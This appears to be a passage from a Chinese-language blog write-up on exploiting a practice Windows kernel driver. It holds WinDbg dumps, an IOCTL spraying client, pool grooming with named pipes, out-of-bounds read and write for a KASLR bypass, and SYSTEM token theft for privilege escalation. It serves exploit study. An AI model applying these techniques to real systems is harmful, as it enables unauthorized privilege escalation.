<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#bd93f9">0</span><span style="color:#ff79c6">:</span> kd<span style="color:#ff79c6">&gt;</span> <span style="color:#ff79c6">!</span>pool FFFFA489243E4A20
</span></span><span style="display:flex;"><span>unable to get nt<span style="color:#ff79c6">!</span>PspSessionIdBitmap
</span></span><span style="display:flex;"><span>Pool page ffffa489243e4a20 region is Nonpaged pool
</span></span><span style="display:flex;"><span> ffffa489243e4000 <span style="color:#8be9fd;font-style:italic">size</span>:  a00 previous <span style="color:#8be9fd;font-style:italic">size</span>:    <span style="color:#bd93f9">0</span>  (Allocated)  Thre
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">*</span>ffffa489243e4a10 <span style="color:#8be9fd;font-style:italic">size</span>:  <span style="color:#bd93f9">440</span> previous <span style="color:#8be9fd;font-style:italic">size</span>:    <span style="color:#bd93f9">0</span>  (Allocated) <span style="color:#ff79c6">*</span>Luci
</span></span><span style="display:flex;"><span>		Owning <span style="color:#8be9fd;font-style:italic">component</span> : Unknown (update pooltag.txt)
</span></span><span style="display:flex;"><span> ffffa489243e4e50 <span style="color:#8be9fd;font-style:italic">size</span>:  <span style="color:#bd93f9">190</span> previous <span style="color:#8be9fd;font-style:italic">size</span>:    <span style="color:#bd93f9">0</span>  (Free)       .l.<span style="color:#ff79c6">:</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">0</span><span style="color:#ff79c6">:</span> kd<span style="color:#ff79c6">&gt;</span> dq FFFFA489243E4A20 L88
</span></span><span style="display:flex;"><span>ffffa489`<span style="color:#bd93f9">243e4</span>a20  <span style="color:#bd93f9">00000000</span>`deadbeef <span style="color:#bd93f9">00000000</span>`deadbeef
</span></span><span style="display:flex;"><span><span style="color:#ff79c6"># ...
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>ffffa489`<span style="color:#bd93f9">243e4</span>e10  <span style="color:#bd93f9">00000000</span>`deadbeef <span style="color:#bd93f9">00000000</span>`deadbeef
</span></span><span style="display:flex;"><span>ffffa489`<span style="color:#bd93f9">243e4</span>e20  <span style="color:#bd93f9">00000000</span>`<span style="color:#bd93f9">00000000</span> <span style="color:#bd93f9">00000000</span>`<span style="color:#bd93f9">00000000</span>
</span></span><span style="display:flex;"><span>ffffa489`<span style="color:#bd93f9">243e4</span>e30  <span style="color:#bd93f9">00000000</span>`<span style="color:#bd93f9">00000000</span> <span style="color:#bd93f9">00000000</span>`<span style="color:#bd93f9">00000000</span>
</span></span><span style="display:flex;"><span>ffffa489`<span style="color:#bd93f9">243e4</span>e40  <span style="color:#bd93f9">00000000</span>`<span style="color:#bd93f9">00000000</span> <span style="color:#bd93f9">00000000</span>`<span style="color:#bd93f9">00000000</span>
</span></span><span style="display:flex;"><span>ffffa489`<span style="color:#bd93f9">243e4</span>e50  ba816c05`<span style="color:#bd93f9">08f</span><span style="color:#bd93f9">395</span>a9 <span style="color:#bd93f9">00000000</span>`<span style="color:#bd93f9">00000000</span>
</span></span></code></pre></div><p>用于调试</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#8be9fd">int</span> <span style="color:#50fa7b">main</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	HANDLE hDevice;
</span></span><span style="display:flex;"><span>	DWORD dwRet;
</span></span><span style="display:flex;"><span>	BOOL stat;
</span></span><span style="display:flex;"><span>	hDevice <span style="color:#ff79c6">=</span> CreateFileW(
</span></span><span style="display:flex;"><span>		DEVICE_NAME,
</span></span><span style="display:flex;"><span>		GENERIC_READ <span style="color:#ff79c6">|</span> GENERIC_WRITE,
</span></span><span style="display:flex;"><span>		<span style="color:#bd93f9">0</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#8be9fd;font-style:italic">NULL</span>,
</span></span><span style="display:flex;"><span>		OPEN_EXISTING,
</span></span><span style="display:flex;"><span>		FILE_ATTRIBUTE_NORMAL,
</span></span><span style="display:flex;"><span>		<span style="color:#8be9fd;font-style:italic">NULL</span>
</span></span><span style="display:flex;"><span>	);
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> (hDevice <span style="color:#ff79c6">==</span> INVALID_HANDLE_VALUE)
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>		std<span style="color:#ff79c6">::</span>cout <span style="color:#ff79c6">&lt;&lt;</span> <span style="color:#f1fa8c">&#34;[-] Error CreateFileW&#34;</span> <span style="color:#ff79c6">&lt;&lt;</span> std<span style="color:#ff79c6">::</span>endl;
</span></span><span style="display:flex;"><span>		exit(EXIT_FAILURE);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	stat <span style="color:#ff79c6">=</span> DeviceIoControl(
</span></span><span style="display:flex;"><span>		hDevice,
</span></span><span style="display:flex;"><span>		<span style="color:#bd93f9">0x222000</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#8be9fd;font-style:italic">NULL</span>, <span style="color:#bd93f9">0</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#8be9fd;font-style:italic">NULL</span>, <span style="color:#bd93f9">0</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">&amp;</span>dwRet,
</span></span><span style="display:flex;"><span>		<span style="color:#8be9fd;font-style:italic">NULL</span>
</span></span><span style="display:flex;"><span>	);
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span>stat)
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>		std<span style="color:#ff79c6">::</span>cout <span style="color:#ff79c6">&lt;&lt;</span> <span style="color:#f1fa8c">&#34;[-] Error DeviceIoControl&#34;</span> <span style="color:#ff79c6">&lt;&lt;</span> std<span style="color:#ff79c6">::</span>endl;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// ADD
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	UINT64 data[<span style="color:#bd93f9">3</span>];
</span></span><span style="display:flex;"><span>	data[<span style="color:#bd93f9">1</span>] <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0xDADADDAA</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">for</span> (<span style="color:#8be9fd">int</span> i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">0x80</span>; i<span style="color:#ff79c6">++</span>) {
</span></span><span style="display:flex;"><span>		data[<span style="color:#bd93f9">0</span>] <span style="color:#ff79c6">=</span> i;
</span></span><span style="display:flex;"><span>		data[<span style="color:#bd93f9">2</span>] <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0xdeadbeef</span>;
</span></span><span style="display:flex;"><span>		stat <span style="color:#ff79c6">=</span> DeviceIoControl(
</span></span><span style="display:flex;"><span>			hDevice,
</span></span><span style="display:flex;"><span>			<span style="color:#bd93f9">0x222004</span>,
</span></span><span style="display:flex;"><span>			<span style="color:#ff79c6">&amp;</span>data, <span style="color:#ff79c6">sizeof</span>(data),
</span></span><span style="display:flex;"><span>			<span style="color:#8be9fd;font-style:italic">NULL</span>, <span style="color:#bd93f9">0</span>,
</span></span><span style="display:flex;"><span>			<span style="color:#ff79c6">&amp;</span>dwRet,
</span></span><span style="display:flex;"><span>			<span style="color:#8be9fd;font-style:italic">NULL</span>
</span></span><span style="display:flex;"><span>		);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	std<span style="color:#ff79c6">::</span>cout <span style="color:#ff79c6">&lt;&lt;</span> <span style="color:#f1fa8c">&#34;[+] ADD Done&#34;</span> <span style="color:#ff79c6">&lt;&lt;</span> std<span style="color:#ff79c6">::</span>endl;
</span></span><span style="display:flex;"><span>	getchar();
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// release
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	stat <span style="color:#ff79c6">=</span> DeviceIoControl(
</span></span><span style="display:flex;"><span>		hDevice,
</span></span><span style="display:flex;"><span>		<span style="color:#bd93f9">0x22200</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#8be9fd;font-style:italic">NULL</span>, <span style="color:#bd93f9">0</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#8be9fd;font-style:italic">NULL</span>, <span style="color:#bd93f9">0</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">&amp;</span>dwRet,
</span></span><span style="display:flex;"><span>		<span style="color:#8be9fd;font-style:italic">NULL</span>
</span></span><span style="display:flex;"><span>	);
</span></span><span style="display:flex;"><span>	CloseHandle(hDevice);
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">return</span> EXIT_SUCCESS;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>布局堆风水</p>
<p>一种堆喷方式：切割</p>
<ul>
<li>两个chunk: 0x800 + 0x7c0</li>
<li>0x800 切割成一个漏洞对象，另一个是pipe</li>
<li>概率出现想要的风水</li>
</ul>
<p>还可以使用论文中的方式</p>
<ul>
<li>首先,分配上千个选中大小的块,以确保首先清空FreeChunkTree中所有大于所选大小的块.</li>
<li>然后,分配器将分配0x10000字节的新VS字段,并将其放入FreeChunkTree.</li>
<li>然后再分配几千个分块,这些分块最终会进入新的大空闲分块,因此是连续的,然后释放最后分配的块的3分之1,用于填充FreeChunkTree,只是放3分之1将确保不会有数据块合并,最后重新分配已释放的数据块,以最大限度增加喷射机会.</li>
</ul>
<p>理想是得到这样的堆布局</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>4: <span style="color:#8be9fd;font-style:italic">kd</span><span style="color:#6272a4">&gt; !pool FFFF8981621A6010</span>
</span></span><span style="display:flex;"><span>unable to get nt!PspSessionIdBitmap
</span></span><span style="display:flex;"><span>Pool page ffff8981621a6010 region is Nonpaged pool
</span></span><span style="display:flex;"><span>*ffff8981621a6000 size:  440 previous size:    0  (Allocated) *Luci
</span></span><span style="display:flex;"><span>		Owning component : Unknown (update pooltag.txt)
</span></span><span style="display:flex;"><span> ffff8981621a6450 size:  440 previous size:    0  (Allocated)  NpFr Process: ffff898162043080
</span></span><span style="display:flex;"><span> ffff8981621a68a0 size:  440 previous size:    0  (Allocated)  NpFr Process: ffff898162043080
</span></span></code></pre></div><p>查看pipe，header</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#bd93f9">4</span><span style="color:#ff79c6">:</span> kd<span style="color:#ff79c6">&gt;</span> dq ffff8981621a6450
</span></span><span style="display:flex;"><span>ffff8981`<span style="color:#bd93f9">621</span>a6450  <span style="color:#bd93f9">7246704</span>e`<span style="color:#bd93f9">0</span>a446f00 f7ca3fb8`<span style="color:#bd93f9">9f7f</span><span style="color:#bd93f9">4811</span>
</span></span><span style="display:flex;"><span>ffff8981`<span style="color:#bd93f9">621</span>a6460  ffffcc05`<span style="color:#bd93f9">0f</span>d259b8 ffffcc05`<span style="color:#bd93f9">0f</span>d259b8
</span></span><span style="display:flex;"><span>ffff8981`<span style="color:#bd93f9">621</span>a6470  <span style="color:#bd93f9">00000000</span>`<span style="color:#bd93f9">00000000</span> ffffcc05`<span style="color:#bd93f9">10</span>a100f0
</span></span><span style="display:flex;"><span>ffff8981`<span style="color:#bd93f9">621</span>a6480  <span style="color:#bd93f9">000003</span>d0`<span style="color:#bd93f9">00000000</span> <span style="color:#bd93f9">00000000</span>`<span style="color:#bd93f9">000003</span>d0
</span></span><span style="display:flex;"><span>ffff8981`<span style="color:#bd93f9">621</span>a6490  <span style="color:#bd93f9">43434343</span>`<span style="color:#bd93f9">43434343</span> <span style="color:#bd93f9">43434343</span>`<span style="color:#bd93f9">43434343</span>
</span></span><span style="display:flex;"><span>ffff8981`<span style="color:#bd93f9">621</span>a64a0  <span style="color:#bd93f9">43434343</span>`<span style="color:#bd93f9">43434343</span> <span style="color:#bd93f9">43434343</span>`<span style="color:#bd93f9">43434343</span>
</span></span><span style="display:flex;"><span>ffff8981`<span style="color:#bd93f9">621</span>a64b0  <span style="color:#bd93f9">43434343</span>`<span style="color:#bd93f9">43434343</span> <span style="color:#bd93f9">43434343</span>`<span style="color:#bd93f9">43434343</span>
</span></span><span style="display:flex;"><span>ffff8981`<span style="color:#bd93f9">621</span>a64c0  <span style="color:#bd93f9">43434343</span>`<span style="color:#bd93f9">43434343</span> <span style="color:#bd93f9">43434343</span>`<span style="color:#bd93f9">43434343</span>
</span></span></code></pre></div><p>越界写入</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#bd93f9">1</span><span style="color:#ff79c6">:</span> kd<span style="color:#ff79c6">&gt;</span> dq ffff8387c055d450
</span></span><span style="display:flex;"><span>ffff8387`c055d450  <span style="color:#bd93f9">7246704</span>e`<span style="color:#bd93f9">0</span>a440000 <span style="color:#bd93f9">330</span>bb4ed`<span style="color:#bd93f9">16</span>bfc9f1
</span></span><span style="display:flex;"><span>ffff8387`c055d460  ffffc288`<span style="color:#bd93f9">07372</span>bd8 ffffc288`<span style="color:#bd93f9">07372</span>bd8
</span></span><span style="display:flex;"><span>ffff8387`c055d470  <span style="color:#bd93f9">00000000</span>`<span style="color:#bd93f9">00000000</span> ffffc288`<span style="color:#bd93f9">057</span><span style="color:#bd93f9">94910</span>
</span></span><span style="display:flex;"><span>ffff8387`c055d480  <span style="color:#bd93f9">00000000</span>`deadbeef <span style="color:#bd93f9">00000000</span>`<span style="color:#bd93f9">000003</span>d0
</span></span><span style="display:flex;"><span>ffff8387`c055d490  <span style="color:#bd93f9">43434343</span>`<span style="color:#bd93f9">43434343</span> <span style="color:#bd93f9">43434343</span>`<span style="color:#bd93f9">43434343</span>
</span></span><span style="display:flex;"><span>ffff8387`c055d4a0  <span style="color:#bd93f9">43434343</span>`<span style="color:#bd93f9">43434343</span> <span style="color:#bd93f9">43434343</span>`<span style="color:#bd93f9">43434343</span>
</span></span><span style="display:flex;"><span>ffff8387`c055d4b0  <span style="color:#bd93f9">43434343</span>`<span style="color:#bd93f9">43434343</span> <span style="color:#bd93f9">43434343</span>`<span style="color:#bd93f9">43434343</span>
</span></span><span style="display:flex;"><span>ffff8387`c055d4c0  <span style="color:#bd93f9">43434343</span>`<span style="color:#bd93f9">43434343</span> <span style="color:#bd93f9">43434343</span>`<span style="color:#bd93f9">43434343</span>
</span></span></code></pre></div><p>读取pipe而且不free掉chunk，可以使用</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>BOOL <span style="color:#50fa7b">PeekNamedPipe</span>(
</span></span><span style="display:flex;"><span>  [in]            HANDLE  hNamedPipe,
</span></span><span style="display:flex;"><span>  [out, optional] LPVOID  lpBuffer,
</span></span><span style="display:flex;"><span>  [in]            DWORD   nBufferSize,
</span></span><span style="display:flex;"><span>  [out, optional] LPDWORD lpBytesRead,
</span></span><span style="display:flex;"><span>  [out, optional] LPDWORD lpTotalBytesAvail,
</span></span><span style="display:flex;"><span>  [out, optional] LPDWORD lpBytesLeftThisMessage
</span></span><span style="display:flex;"><span>);
</span></span></code></pre></div><p>修改DataSize越界读取，泄露nt的基址，从而可以bypass kaslr</p>
<ul>
<li>Page segment = PipeQueueEntry &amp; 0xfffffffffff00000 (Segment mask)</li>
<li>Signature of Page segment = readmem(Page segment + 0x10)</li>
<li>Segcontext = (Page segment) ^ (Signature of Page segment) ^ RtlpHpHeapGlobals.HeapKey ^ 0xA2E64EADA2E64EAD</li>
<li>Segment heap = Segcontext - 0x100</li>
<li>callback function: Segment heap-&gt;VsContext，RtlpHpHeapGlobals.HeapKey ^ encode data ^ VsContext address</li>
</ul>
<p>任意地址读取：EntryType 为unbuffer时可以读取Irp，而这个Irp可以伪造</p>
<p>提权：我们可以读取system的token值，然后根据驱动的任意写写入当前进程</p>
<h3 id="api-前缀">API 前缀</h3>
<p>代表着Windows native（原生）系统服务（system services）例程（routines）。</p>
<p>Ke － kernel的缩写，代表的是内核模式的API接口。</p>
<p>Nt － Windows New Technology的缩写，代表的是 Windows 系统服务功能API接口。 大部分以Nt开头的函数，都映射到了用户态（User Mode）API接口。比如你编写的用户模式程序，用到了CreateFile这个函数，由于它需要访问系统内部的数据结构，必须要进入内核模式，这时的程序就要转入内核模式，相对应的内核模式功能服务接口，正是ntdll.dll中的NtCreateFile，它最终完成来自用户态程序的函数功能请求。</p>
<p>Zw － 没有具体的缩写含义，只是为了避免和其它前缀的重复。它的功能和与之相对应的Nt函数是一致的（可以说是Nt功能的镜像）。 不同点在于： 相应的Nt函数，是对系统服务的直接；而Zw需要经过一系列系统准备动作，比如：系统服务码入寄存器保存，系统KiSystemService加载，然后才执行具体的服务功能调用。 看着负担加重了，但好处是，在执行时，系统参数的系列校验不必再进行了（拜所谓的previous access mode之赐），所以反而轻快了；而Nt系列函数虽然调用时简洁，但每一次执行都要参数校验，因此反而累赘了。这也正是内核态程序（比如驱动程序）多用Zw系统的原因（因为需要和previous mode打交道）。</p>
<h3 id="reference">reference</h3>
<ul>
<li><a href="https://exploitreversing.com/2023/04/11/exploiting-reversing-er-series/">Exploiting Reversing (ER) series: article 01 – Exploit Reversing</a></li>
<li><a href="https://exploitreversing.com/2024/01/03/exploiting-reversing-er-series-article-02/">Exploiting Reversing (ER) series: article 02 – Exploit Reversing</a></li>
<li><a href="https://www.slideshare.net/">Share &amp; Discover Presentations</a></li>
<li><a href="https://www.vergiliusproject.com/">windows undocumented structure: vergilius project</a></li>
<li><a href="http://windbg.info/doc/1-common-cmds.html">Windbg command: WinDbg.info</a></li>
</ul>
		</section>

		<div class="post-tags">
			
			
			<nav class="nav tags">
				<ul class="tags">
					
					<li><a href="/tags/windows">Windows</a></li>
					
				</ul>
			</nav>
			
			
		</div>
		<div id="disqus_thread"></div>
<script type="text/javascript">
    (function () {
        
        
        if (window.location.hostname == "localhost")
            return;

        var dsq = document.createElement('script');
        dsq.type = 'text/javascript';
        dsq.async = true;
        var disqus_shortname = 'ldrx30';
        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();
</script>

</article>
</main>
<footer>
  <div style="display:flex"><a class="soc" href="https://github.com/ldrx30" rel="me" title="GitHub"><i data-feather="github"></i></a>
    <a class="border"></a></div>
  <div class="footer-info">
    2024  © ldrx30 |  <a
      href="https://github.com/athul/archie">Archie Theme</a> | Built with <a href="https://gohugo.io">Hugo</a>
  </div>
</footer>
<script>
  feather.replace()
</script></div>
    </body>
</html>
